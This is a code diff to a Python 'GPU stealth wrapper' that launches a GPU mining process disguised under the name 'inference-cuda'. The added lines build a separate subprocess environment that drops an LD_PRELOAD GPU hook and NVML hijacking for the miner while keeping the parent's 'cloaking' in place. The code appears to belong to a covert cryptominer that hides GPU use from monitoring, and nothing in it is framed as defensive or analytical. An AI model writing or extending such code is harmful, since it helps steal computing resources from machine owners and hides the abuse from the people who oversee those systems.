@@ -81,6 +81,31 @@ def main():
         cuda_inference_args = sys.argv[1:]  # Remove script name
         logger.info(f"🔍 [GPU-STEALTH-WRAPPER] inference-cuda args: {cuda_inference_args}")
         
+        # ✅ CORRECTED: Create clean environment for subprocess ONLY (preserves parent cloaking)
+        logger.info("🔧 [GPU-SUBPROCESS-ISOLATION] Creating clean environment for GPU mining subprocess")
+        
+        # Create clean environment copy for subprocess execution (không modify parent environment)
+        clean_env = os.environ.copy()
+        
+        # 1. Remove ONLY GPU-interfering hooks from subprocess environment
+        if 'LD_PRELOAD' in clean_env:
+            preload_libs = clean_env['LD_PRELOAD'].split(':')
+            # Remove chỉ libgpuhook.so (NVML interference), keep thermal hooks for parent
+            filtered_libs = [lib for lib in preload_libs if 'libgpuhook.so' not in lib]
+            
+            if filtered_libs:
+                clean_env['LD_PRELOAD'] = ':'.join(filtered_libs)
+                logger.info(f"🔧 [GPU-SUBPROCESS-ISOLATION] Subprocess LD_PRELOAD: {clean_env['LD_PRELOAD']}")
+            else:
+                del clean_env['LD_PRELOAD']
+                logger.info("🔧 [GPU-SUBPROCESS-ISOLATION] Removed LD_PRELOAD from subprocess only")
+        
+        # 2. Disable NVML hijacking for subprocess only (keep parent values intact)
+        clean_env['ENABLE_NVML_IPC_HIJACKING'] = '0'  # Only for subprocess
+        clean_env['GPU_MINING_SUBPROCESS'] = '1'      # Flag for identification
+        
+        logger.info("✅ [GPU-SUBPROCESS-ISOLATION] Clean environment prepared for subprocess (parent cloaking preserved)")
+
         # Get inference-cuda binary path from environment
         cuda_inference_path = os.getenv('CUDA_COMMAND', '/usr/local/bin/inference-cuda')
         if not os.path.exists(cuda_inference_path):
@@ -141,7 +166,8 @@ def main():
             # Start inference-cuda as subprocess
             # **FIX: Remove stdout/stderr redirection to allow parent capture** (sửa: bỏ chuyển hướng stdout/stderr để parent có thể capture)
             process = subprocess.Popen(
-                exec_command
+                exec_command,
+                env=clean_env  # Use clean environment for subprocess ONLY
                 # stdout and stderr will inherit parent's pipes for logging
             )
             logger.info(f"✅ [GPU-POST-EXEC-STEALTH] inference-cuda started as subprocess PID: {process.pid}")
@@ -197,7 +223,8 @@ def main():
                 process = subprocess.Popen(
                     exec_command,
                     stdout=sys.stdout,
-                    stderr=sys.stderr
+                    stderr=sys.stderr,
+                    env=clean_env  # Use clean environment for fallback subprocess too
                 )
                 
                 logger.info(f"✅ [GPU-STEALTH-WRAPPER] inference-cuda started as subprocess PID: {process.pid}")
